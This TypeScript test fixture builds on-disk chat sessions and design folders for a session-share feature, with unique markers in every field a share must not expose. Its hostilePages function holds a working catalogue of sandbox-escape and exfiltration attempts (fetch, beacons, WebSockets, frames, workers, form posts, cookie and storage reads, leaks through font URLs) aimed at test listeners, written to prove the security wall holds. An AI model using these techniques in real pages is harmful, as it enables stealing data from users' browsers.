// A chat with a Lookbook, on disk, for the session-share Lookbook tests (§app.session-share/never,
// /content, /snapshot): its session file and its design folder (state.json, every page, a still, the
// history, the page assets), with a unique marker in every field a share must never carry, and a
// second chat whose store reuses the same run id and label. Plain files only: it imports no product
// module, so a test may call it before or after it sets PI_CODING_AGENT_DIR.
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";

/** Every marker, by the field it sits in. Each is unique and in no ordinary word. */
export const LB = {
  // The Creative Director and the run: its Setup, Design Brief, Full Prompt, questions, status.
  setupBrief: "MK-LB-SETUPBRIEF-q7x",
  modelRef: "mkprov-lb/mk-lb-model-q7x",
  modelPickerName: "MK-LB-PICKERNAME-q7x",
  coordinatorRef: "mkprov-lb/mk-lb-cdmodel-q7x",
  untickedStyle: "MK-LB-UNTICKED-q7x",
  briefSummary: "MK-LB-BRIEFSUM-q7x",
  briefPrompt: "MK-LB-PROMPT-q7x",
  briefQuestion: "MK-LB-QUESTION-q7x",
  briefNote: "MK-LB-BRIEFNOTE-q7x",
  runError: "MK-LB-RUNERR-q7x",
  skillName: "MK-LB-SKILL-q7x",
  skillDir: "/var/mk-lb-skilldir-q7x",
  linkUrl: "https://mk-lb-link-q7x.example.invalid/",
  leftOut: "mk-lb-leftout-q7x",
  coordinatorSession: "0199cdcd-mk-lb-cdsession-q7x",
  coordinatorFile: "/var/mk-lb-cdfile-q7x.jsonl",
  coordinatorCard: "MK-LB-CDCARD-q7x",
  coordinatorAsk: "MK-LB-CDASK-q7x",
  // Each design's record beyond its letter, style, layout, model name and finished versions.
  designSession: "0199dddd-mk-lb-dsession-q7x",
  designFile: "/var/mk-lb-dfile-q7x.jsonl",
  designError: "MK-LB-DERROR-q7x",
  designFix: "MK-LB-DFIX-q7x",
  unchanged: "MK-LB-UNCHANGED-q7x",
  deliveryKey: "mk-lb-delivkey-q7x",
  deliveryError: "MK-LB-DELIVERR-q7x",
  designSkillDir: "/var/mk-lb-dskill-q7x",
  cost: "0.876543219",
  effort: "mk-lb-effort-q7x",
  versionNote: "MK-LB-VNOTE-q7x",
  viewProblem: "MK-LB-VIEWPROBLEM-q7x",
  // The runner's own notes, a page being written, a still, the history, the page assets.
  internalBrief: "MK-LB-INTERNALBRIEF-q7x",
  internalInstructions: "MK-LB-INSTRUCT-q7x",
  internalRefused: "MK-LB-REFUSED-q7x",
  pending: "MK-LB-PENDING-q7x",
  still: "MK-LB-STILL-q7x",
  historyText: "MK-LB-HISTORY-q7x",
  captureUrl: "https://mk-lb-capture-q7x.example.invalid/account",
  captureTitle: "MK-LB-CAPTITLE-q7x",
  assetPageUrl: "https://mk-lb-assetpage-q7x.example.invalid/",
  assetDescription: "MK-LB-ASSETDESC-q7x",
  assetNote: "MK-LB-ASSETNOTE-q7x",
  // The tool call that made the card, and its result's words.
  toolArg: "MK-LB-TOOLARG-q7x",
  toolOut: "MK-LB-TOOLOUT-q7x",
  // Designs and pages no recipient may get.
  removedPage: "MK-LB-REMOVEDPAGE-q7x",
  removedStyle: "MK-LB-REMOVEDSTYLE-q7x",
  failedStyle: "MK-LB-FAILEDSTYLE-q7x",
  abandonedPage: "MK-LB-ABANDONEDPAGE-q7x",
  abandonedStyle: "MK-LB-ABANDONEDSTYLE-q7x",
  unanchoredPage: "MK-LB-UNANCHOREDPAGE-q7x",
  unanchoredStyle: "MK-LB-UNANCHOREDSTYLE-q7x",
  otherChatPage: "MK-LB-OTHERCHATPAGE-q7x",
  otherChatStyle: "MK-LB-OTHERCHATSTYLE-q7x",
  // A secret the server knows by value (set by the test as MK_SHARE_API_KEY), written into a shown page.
  pageSecret: "mkSecretValue-q7x-4f9a2c71be",
} as const;

/** Markers that a snapshot leaves out and Follow live rightly shows: what came after the cut. */
export const LB_AFTER_CUT = { versionAfterCut: "MK-LB-V3AFTERCUT-q7x", runAfterCutPage: "MK-LB-RUNAFTERPAGE-q7x", runAfterCutStyle: "MK-LB-RUNAFTERSTYLE-q7x" } as const;

/** What a recipient may see of the shared run's designs: by letter, the versions each shows. */
export const LB_SHOWN = {
  /** A ready design with three versions; v3 is after the snapshot's cut. */
  A: { style: "Quiet Editorial", layout: "Split Hero", modelName: "Mk Display Model", snapshot: [1, 2], live: [1, 2, 3], pages: { 1: "VISIBLE-LB-PAGE-A1", 2: "VISIBLE-LB-PAGE-A2", 3: LB_AFTER_CUT.versionAfterCut } },
  /** Being refined: its finished v1 shows, never the page being written. */
  B: { style: "Bold Grid", layout: undefined, modelName: "Mk Other Model", snapshot: [1], live: [1], pages: { 1: "VISIBLE-LB-PAGE-B1" } },
} as const;

export const LB_SESSION_ID = "0199eeee-ffff-7aaa-8bbb-q7xlookbook";
export const LB_OTHER_SESSION_ID = "0199eeee-ffff-7aaa-8bbb-q7xotherchat";
/** The run every chat's store names, the shared one's and the other chat's alike. */
export const LB_RUN = "run_mkq7xshared";

/** A benign page with an inline script and a Google font: it must survive the server's filters whole. */
export const benignPage = (mark: string): string =>
  `<!doctype html><html><head><meta charset="utf-8"><title>${mark}</title>` +
  `<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">` +
  `<style>body{font-family:Inter,sans-serif;margin:0}h1{font-weight:700}.tab[aria-selected=true]{color:#c00}</style></head>` +
  `<body><h1 id="h">${mark}</h1><nav role="tablist"><button class="tab" role="tab" aria-selected="true" data-sova-view="Home">Home</button><button class="tab" role="tab" data-sova-view="Pricing">Pricing</button></nav>` +
  `<p id="ran">not yet</p><img alt="logo" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">` +
  `<script>document.getElementById("ran").textContent = "script ran " + (1 + 1); const xs = [1, 2, 3].map((x) => x * 2); if (xs.length < 3 && "a" > "b") console.log("<b>&amp;</b>");</script></body></html>`;

/**
 * A hostile design's pages, for the Chrome wall test. `L` is a listening server elsewhere, `S` the share
 * listener's own origin and `api` its /api/s/<token> answer: every way out names /leak/ (or `?leak=`), so
 * any hit on either server, or any request Chrome makes with `leak` in it, is an escape. Version 1 tries
 * everything that keeps its own document and writes what happened into #tries; each later version
 * replaces its document one way, a form post included (the shell must stop it, and nothing may reach out).
 */
export function hostilePages(L: string, S: string, api: string): string[] {
  const everything = `
// What the page's policy refuses, as the browser reports it: proof the wall is enforced here, not just quiet.
const violations = [];
addEventListener("securitypolicyviolation", (e) => violations.push(e.effectiveDirective + " " + e.blockedURI));
fetch(L + "/leak/fetch-probe").then(() => "resolved", () => "rejected").then((v) => { document.getElementById("fetchprobe").textContent = v; });
setTimeout(() => { document.getElementById("csp").textContent = JSON.stringify(violations); }, 600);
const tries = [];
const t = (name, fn) => { try { const v = fn(); tries.push(name + ":" + (v === undefined ? "ok" : String(v).slice(0, 60))); } catch (e) { tries.push(name + ":threw"); } };
for (const base of [L, S]) {
  t("fetch", () => void fetch(base + "/leak/fetch?x=1").catch(() => {}));
  t("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", base + "/leak/xhr"); x.send(); });
  t("beacon", () => navigator.sendBeacon(base + "/leak/beacon", "x"));
  t("socket", () => void new WebSocket(base.replace("http", "ws") + "/leak/ws"));
  t("img", () => { new Image().src = base + "/leak/img?x=1"; });
  t("img-tag", () => { const i = document.createElement("img"); i.src = base + "/leak/imgtag"; document.body.append(i); });
  t("style", () => { const l = document.createElement("link"); l.rel = "stylesheet"; l.href = base + "/leak/css"; document.head.append(l); });
  t("prefetch", () => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = base + "/leak/prefetch"; document.head.append(l); });
  t("font", () => { const st = document.createElement("style"); st.textContent = "@font-face{font-family:x;src:url(" + base + "/leak/font)} body{font-family:x}"; document.head.append(st); });
  t("script", () => { const s = document.createElement("script"); s.src = base + "/leak/script"; document.head.append(s); });
  t("frame", () => { const f = document.createElement("iframe"); f.src = base + "/leak/frame"; document.body.append(f); });
  t("frame-nav", () => { const f = document.createElement("iframe"); f.srcdoc = "<script>location.href=" + JSON.stringify(base + "/leak/grandchild") + "<\\/script>"; document.body.append(f); });
  // A frame of its own from a data: address (the one kind its shell may frame): it must still reach nothing.
  t("data-frame", () => { const f = document.createElement("iframe"); f.src = "data:text/html," + encodeURIComponent("<script>fetch(" + JSON.stringify(base + "/leak/data-frame") + ").catch(()=>{});new Image().src=" + JSON.stringify(base + "/leak/data-frame-img") + "<\\/script>"); document.body.append(f); });
  t("blob-frame", () => { const f = document.createElement("iframe"); f.src = URL.createObjectURL(new Blob(["<script>fetch(" + JSON.stringify(base + "/leak/blob-frame") + ").catch(()=>{})<\\/script>"], { type: "text/html" })); document.body.append(f); });
  t("worker", () => void new Worker(base + "/leak/worker"));
  t("popup", () => window.open(base + "/leak/open"));
  t("top", () => { top.location.href = base + "/leak/top"; });
  t("parent", () => { parent.location.href = base + "/leak/parent"; });
  t("link-top", () => { const a = document.createElement("a"); a.href = base + "/leak/click-top"; a.target = "_top"; document.body.append(a); a.click(); });
  t("link-blank", () => { const a = document.createElement("a"); a.href = base + "/leak/click-blank"; a.target = "_blank"; document.body.append(a); a.click(); });
}
t("api", () => void fetch(API + "?leak=api").catch(() => {}));
t("api-img", () => { new Image().src = API + "/img/0?leak=img"; });
t("parent-dom", () => parent.document.title);
t("top-dom", () => top.document.body.innerHTML.length);
t("top-href", () => top.location.href);
t("storage", () => localStorage.getItem("x"));
t("session", () => sessionStorage.getItem("x"));
t("cookie", () => document.cookie);
t("idb", () => indexedDB.open("x") && "opened");
t("rtc", () => typeof RTCPeerConnection);
t("origin", () => String(origin));
t("top-post", () => top.postMessage({ "sova-design-frame": 1, op: "left" }, "*"));
// Where the page thinks it is: none of it may name the share's link. Then try to carry it out the one
// way the policy leaves open, a Google Fonts stylesheet.
const where = { baseURI: document.baseURI, href: location.href, url: document.URL, referrer: document.referrer, ancestors: [...(location.ancestorOrigins || [])] };
document.getElementById("where").textContent = JSON.stringify(where);
{ const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "https://fonts.googleapis.com/css2?family=Leak&where=" + encodeURIComponent(JSON.stringify(where)); document.head.append(l); }
document.getElementById("tries").textContent = JSON.stringify(tries);
`;
  const exits = [
    `location.href = L + "/leak/self?x=1";`,
    `location = S + "/leak/self-sova";`,
    `location.replace(L + "/leak/replace");`,
    `const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + L + "/leak/refresh"; document.head.append(m);`,
    `const a = document.createElement("a"); a.href = L + "/leak/click"; document.body.append(a); a.click();`,
    `window.open(L + "/leak/open-self", "_self");`,
    // A form post, by script and by a click (the page's own wall stops a submit event; .submit() fires none).
    `const f = document.createElement("form"); f.action = L + "/leak/form"; f.method = "post"; const i = document.createElement("input"); i.name = "x"; i.value = "1"; f.append(i); document.body.append(f); f.submit();`,
    `const f = document.createElement("form"); f.action = S + "/leak/form-sova"; f.method = "post"; document.body.append(f); f.requestSubmit ? f.requestSubmit() : f.submit(); setTimeout(() => f.submit(), 100);`,
  ];
  const prelude = `const L = ${JSON.stringify(L)}, S = ${JSON.stringify(S)}, API = ${JSON.stringify(api)};`;
  const page = (body: string, code: string) => `<!doctype html><html><head><meta charset="utf-8"><title>hostile</title></head><body>${body}<script>${prelude}\naddEventListener("load", () => setTimeout(() => { ${code} }, 50));</script></body></html>`;
  return [
    page(`<h1 id="h">VISIBLE-LB-HOSTILE</h1><pre id="where">none</pre><pre id="tries">none</pre><pre id="csp">none</pre><pre id="fetchprobe">none</pre><a id="out" href="${L}/leak/person-click">out</a>`, everything),
    ...exits.map((code, i) => page(`<h1 id="h">VISIBLE-LB-EXIT-${i + 2}</h1>`, code)),
  ];
}

/** A page of about `mb` megabytes of text, its marker at the top and `VISIBLE-LB-BIG-END` at the very end, with an inline script. */
export const bigPage = (mb: number): string => {
  const para = `<p>${"Lorem ipsum dolor sit amet, consectetur adipiscing elit. ".repeat(17)}</p>\n`;
  return `<!doctype html><html><head><meta charset="utf-8"><title>big</title><style>body{font:14px/1.4 sans-serif;margin:0 2rem}</style></head><body><h1 id="h">VISIBLE-LB-BIG</h1><p id="ran">not yet</p>${para.repeat(Math.ceil((mb * 1024 * 1024) / para.length))}<p id="end">VISIBLE-LB-BIG-END</p><script>document.getElementById("ran").textContent = "script ran " + document.querySelectorAll("p").length;</script></body></html>`;
};

/** A page that shows its marker and carries the known secret (which the server must redact). */
const pageWith = (mark: string, secret = false): string => benignPage(mark).replace("</body>", `${secret ? `<p>key ${LB.pageSecret}</p>` : ""}</body>`);

/** A page with a whole font inlined as base64 and an inline SVG: long opaque runs the text filters must leave alone. */
export const heavyPage = (mark: string): string =>
  benignPage(mark).replace(
    "</style>",
    `@font-face{font-family:Plex;src:url(data:font/woff2;base64,${readFileSync(join(import.meta.dirname, "..", "public", "fonts", "IBMPlexMono-400.woff2")).toString("base64")}) format("woff2")}p{font-family:Plex}</style>`,
  ).replace("</body>", `<svg viewBox="0 0 24 24" width="24"><path d="M12 2a10 10 0 1 0 0 20A10 10 0 0 0 12 2zm0 3.5a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3z" fill="#3a6df0"/></svg></body>`);

const iso = (s: number) => new Date(Date.UTC(2026, 8, 30, 0, 0, s)).toISOString();

export interface LookbookFixture {
  sessionPath: string;
  otherSessionPath: string;
  /** The snapshot's cut entry and its time. */
  cut: string;
  cutAt: string;
  /** The entry the shared run's card hangs from (the lookbook result), and the user message just before it. */
  cardEntry: string;
  /** Entries before and after the card, for slices: a slice from `afterCard` leaves the shared run out. */
  beforeCard: string;
  afterCard: string;
  /** Every page text by label and version, as written. */
  pages: Record<string, Record<number, string>>;
  lines: Record<string, unknown>[];
}

/** Write both chats into `agentDir` (its sessions/ and design/ folders). */
export function writeLookbookChat(agentDir: string): LookbookFixture {
  const home = homedir();
  const cwd = join(home, "code", "mk-lb-project-q7x");
  // In a project's folder, as Sova keeps them, so the operator's routes find the chat by its id.
  const sessions = join(agentDir, "sessions", "--mk-lb-proj--");
  mkdirSync(sessions, { recursive: true });
  const sessionPath = join(sessions, `2026-09-30T00-00-00-000Z_${LB_SESSION_ID}.jsonl`);
  const otherSessionPath = join(sessions, `2026-09-30T00-00-00-000Z_${LB_OTHER_SESSION_ID}.jsonl`);

  const lines: Record<string, unknown>[] = [{ type: "session", version: 3, id: LB_SESSION_ID, timestamp: iso(0), cwd }];
  let seq = 0;
  let last: string | null = null;
  const add = (entry: Record<string, unknown>, at: number, parent: string | null = last): string => {
    const id = `lb${String(++seq).padStart(3, "0")}`;
    lines.push({ id, parentId: parent, timestamp: iso(at), ...entry });
    last = id;
    return id;
  };
  const user = (text: string, at: number) => add({ type: "message", message: { role: "user", content: [{ type: "text", text }], timestamp: at } }, at);
  const reply = (text: string, at: number) => add({ type: "message", message: { role: "assistant", content: [{ type: "text", text }], provider: "mkprov-lb", model: "mk-lb-main-q7x", stopReason: "stop", timestamp: at } }, at);
  /** A lookbook call and its card-bearing result. Returns the result's id. */
  const card = (call: string, runId: string, at: number): string => {
    add({ type: "message", message: { role: "assistant", content: [{ type: "toolCall", id: call, name: "lookbook", arguments: { op: "setup", brief: LB.toolArg } }], provider: "mkprov-lb", model: "mk-lb-main-q7x", stopReason: "toolUse", timestamp: at } }, at);
    const id = add({ type: "message", message: { role: "toolResult", toolCallId: call, toolName: "lookbook", content: [{ type: "text", text: `The Setup card is on screen (run ${runId}). ${LB.toolOut}` }], details: { designCard: { runId } }, isError: false, timestamp: at } }, at);
    add({ type: "custom", customType: "sova-design-run", data: { v: 1, runId, at: iso(at), setup: { brief: LB.setupBrief, models: [LB.modelRef], coordinator: LB.coordinatorRef } } }, at);
    return id;
  };

  const beforeCard = user("VISIBLE-LB-ASK make me a lookbook", 1);
  const cardEntry = card("call_lb1", LB_RUN, 2);
  const afterCard = reply("VISIBLE-LB-REPLY here they are", 3);
  // A rewind left a branch with a run of its own behind.
  const fork = last;
  user("an abandoned ask", 4);
  card("call_lb_abandoned", "run_mkq7xabandoned", 4);
  last = fork;
  const cut = user("VISIBLE-LB-CUT before the cut", 10);
  const cutAt = iso(10);
  card("call_lb_after", "run_mkq7xafter", 25);
  reply("VISIBLE-LB-LATER after the cut", 26);
  writeFileSync(sessionPath, `${lines.map((l) => JSON.stringify(l)).join("\n")}\n`);

  // The other chat: its own file, nothing of it shared.
  const other = [
    { type: "session", version: 3, id: LB_OTHER_SESSION_ID, timestamp: iso(0), cwd },
    { type: "message", id: "ot001", parentId: null, timestamp: iso(1), message: { role: "user", content: [{ type: "text", text: "other chat" }] } },
  ];
  writeFileSync(otherSessionPath, `${other.map((l) => JSON.stringify(l)).join("\n")}\n`);

  const designRoot = join(agentDir, "design");
  const pages: Record<string, Record<number, string>> = {
    A: { 1: pageWith(LB_SHOWN.A.pages[1], true), 2: heavyPage(LB_SHOWN.A.pages[2]), 3: pageWith(LB_SHOWN.A.pages[3]) },
    B: { 1: pageWith(LB_SHOWN.B.pages[1]) },
    C: { 1: pageWith(LB.removedPage) },
    F: { 1: pageWith(LB.abandonedPage) },
    G: { 1: pageWith(LB_AFTER_CUT.runAfterCutPage) },
    H: { 1: pageWith(LB.unanchoredPage) },
  };
  const view = (name: string) => ({ name, source: "declared", state: "unreachable", problem: LB.viewProblem });
  const version = (n: number, at: number) => ({ n, at: iso(at), chars: 1000, by: n === 1 ? "first" : "refine", note: { layout: LB.versionNote, sections: LB.versionNote, type: LB.versionNote, color: LB.versionNote }, views: [view("Pricing")] });
  const record = (label: string, runId: string, direction: string, layout: string | undefined, modelName: string, versions: unknown[], extra: Record<string, unknown> = {}) => ({
    label,
    runId,
    direction,
    ...(layout ? { layout } : {}),
    model: LB.modelRef,
    parents: [],
    status: "ready",
    error: LB.designError,
    unchanged: { reason: LB.unchanged, at: iso(9) },
    route: "tool",
    versions,
    skills: [{ name: LB.skillName, dir: LB.designSkillDir }],
    sessionId: LB.designSession,
    sessionFile: LB.designFile,
    modelName,
    effort: LB.effort,
    workerState: "idle",
    vision: true,
    delivery: { state: "undelivered", key: LB.deliveryKey, at: iso(9), error: LB.deliveryError },
    usage: { input: 111, output: 222, cost: Number(LB.cost) },
    createdAt: iso(2),
    updatedAt: iso(9),
    ...extra,
  });
  const run = (id: string, at: number, labels: string[]) => ({
    id,
    setup: {
      brief: LB.setupBrief,
      models: [
        { ref: LB.modelRef, name: LB.modelPickerName, design: true, coordinator: false, vision: true, route: "tool", effort: LB.effort },
        { ref: LB.coordinatorRef, name: LB.modelPickerName, design: false, coordinator: true, vision: true, route: "tool" },
      ],
      directions: [
        { name: LB_SHOWN.A.style, on: true },
        { name: LB.untickedStyle, on: false },
      ],
      layouts: [{ name: LB_SHOWN.A.layout, on: true }],
      links: [{ url: LB.linkUrl, use: "images", by: "user" }],
    },
    phase: "done",
    labels,
    brief: {
      rev: 3,
      textRev: 2,
      summary: LB.briefSummary,
      prompt: LB.briefPrompt,
      promptBy: "coordinator",
      writing: null,
      conflict: null,
      questions: [{ id: "q1", topic: "t", ask: LB.briefQuestion, recommendation: { choice: "x", why: LB.briefQuestion }, answer: { text: LB.briefQuestion, by: "you", at: iso(2) } }],
      looks: { [LB.linkUrl]: { state: "ready", text: LB.briefNote, by: "vision" } },
      notes: { [LB.linkUrl]: { text: LB.briefNote, by: "capture" } },
    },
    error: LB.runError,
    skills: [{ name: LB.skillName, description: LB.skillName, dir: LB.skillDir, from: "named" }],
    leftOut: [{ section: LB.leftOut, name: LB.leftOut, why: "no-key" }],
    images: ["a1"],
    createdAt: iso(at),
    updatedAt: iso(at),
  });
  const state = {
    v: 1,
    labels: 8,
    runs: [run(LB_RUN, 2, ["A", "B", "C", "D", "E"]), run("run_mkq7xabandoned", 4, ["F"]), run("run_mkq7xafter", 25, ["G"]), run("run_mkq7xunanchored", 5, ["H"])],
    designs: [
      record("A", LB_RUN, LB_SHOWN.A.style, LB_SHOWN.A.layout, LB_SHOWN.A.modelName, [version(1, 5), version(2, 8), version(3, 20)], { fix: { reason: LB.designFix, attempt: 1, of: 3 } }),
      record("B", LB_RUN, LB_SHOWN.B.style, undefined, LB_SHOWN.B.modelName, [version(1, 6)], { status: "writing", workerState: "working", live: { version: 2, chars: 400, estimateUsd: Number(LB.cost) } }),
      record("C", LB_RUN, LB.removedStyle, undefined, "Mk Removed Model", [version(1, 6)], { removed: { at: iso(7), by: "user" } }),
      record("D", LB_RUN, LB.failedStyle, undefined, "Mk Failed Model", [], { status: "failed" }),
      record("E", LB_RUN, LB.failedStyle, undefined, "Mk Stopped Model", [], { status: "stopped", stopped: { at: iso(7), by: "user", still: { n: 1, chars: 100, at: iso(7) } } }),
      record("F", "run_mkq7xabandoned", LB.abandonedStyle, undefined, "Mk Abandoned Model", [version(1, 5)]),
      record("G", "run_mkq7xafter", LB_AFTER_CUT.runAfterCutStyle, undefined, "Mk After Model", [version(1, 27)]),
      record("H", "run_mkq7xunanchored", LB.unanchoredStyle, undefined, "Mk Unanchored Model", [version(1, 5)]),
    ],
    coordinator: { sessionId: LB.coordinatorSession, sessionFile: LB.coordinatorFile, model: LB.coordinatorRef, status: "idle", card: LB.coordinatorCard, revision: 2, tracking: 5, ask: { id: "k1", text: LB.coordinatorAsk } },
    pending: { B: { html: pageWith(LB.pending), at: iso(9) } },
    parentPath: sessionPath,
    cwd,
    internal: { A: { attempt: 1, brief: LB.internalBrief, by: "refine", instructions: LB.internalInstructions, refused: LB.internalRefused } },
  };
  const dir = join(designRoot, encodeURIComponent(LB_SESSION_ID));
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "state.json"), JSON.stringify(state));
  for (const [label, byN] of Object.entries(pages)) {
    mkdirSync(join(dir, label), { recursive: true });
    for (const [n, html] of Object.entries(byN)) writeFileSync(join(dir, label, `v${n}.html`), html);
  }
  mkdirSync(join(dir, "E"), { recursive: true });
  writeFileSync(join(dir, "E", "still1.html"), pageWith(LB.still));
  writeFileSync(
    join(dir, "history.json"),
    JSON.stringify({ v: 1, seq: 2, items: [{ id: "h1", at: iso(2), kind: "prompt", by: "coordinator", runId: LB_RUN, rev: 1, text: LB.historyText }, { id: "h2", at: iso(6), kind: "message", by: "user", runId: LB_RUN, label: "A", text: LB.historyText, via: "refine", version: 2 }] }),
  );
  mkdirSync(join(dir, "assets"), { recursive: true });
  writeFileSync(
    join(dir, "assets", "catalogue.json"),
    JSON.stringify({
      v: 1,
      named: 1,
      assets: [{ name: "a1", sha256: "0".repeat(64), source: "page", mime: "image/png", ext: "png", bytes: 1, width: 1, height: 1, small: { w: 1, h: 1, bytes: 1 }, full: { w: 1, h: 1, bytes: 1 }, describe: { w: 1, h: 1, bytes: 1 }, context: { pageUrl: LB.assetPageUrl, pageTitle: LB.captureTitle }, addedAt: iso(2), description: { text: LB.assetDescription }, note: LB.assetNote }],
      captures: [{ id: "c1", runId: LB_RUN, url: LB.captureUrl, title: LB.captureTitle, at: iso(2), names: [], skipped: [], notes: {}, signedIn: true, bytes: 1, ms: 1 }],
      signedInConsent: [{ origin: new URL(LB.captureUrl).origin, at: iso(2) }],
      describeUsage: { input: 1, output: 1, cost: Number(LB.cost), counted: [LB.coordinatorSession] },
    }),
  );

  // The other chat's store: the same run id and label A, and a label (I) the shared chat doesn't have.
  const otherDir = join(designRoot, encodeURIComponent(LB_OTHER_SESSION_ID));
  mkdirSync(otherDir, { recursive: true });
  writeFileSync(
    join(otherDir, "state.json"),
    JSON.stringify({ v: 1, labels: 9, runs: [run(LB_RUN, 2, ["A", "I"])], designs: [record("A", LB_RUN, LB.otherChatStyle, undefined, "Mk Otherchat Model", [version(1, 5), version(2, 6), version(4, 6)]), record("I", LB_RUN, LB.otherChatStyle, undefined, "Mk Otherchat Model", [version(1, 5)])], coordinator: null }),
  );
  for (const [label, ns] of [["A", [1, 2, 4]], ["I", [1]]] as const) {
    mkdirSync(join(otherDir, label), { recursive: true });
    for (const n of ns) writeFileSync(join(otherDir, label, `v${n}.html`), pageWith(LB.otherChatPage));
  }

  return { sessionPath, otherSessionPath, cut, cutAt, cardEntry, beforeCard, afterCard, pages, lines };
}
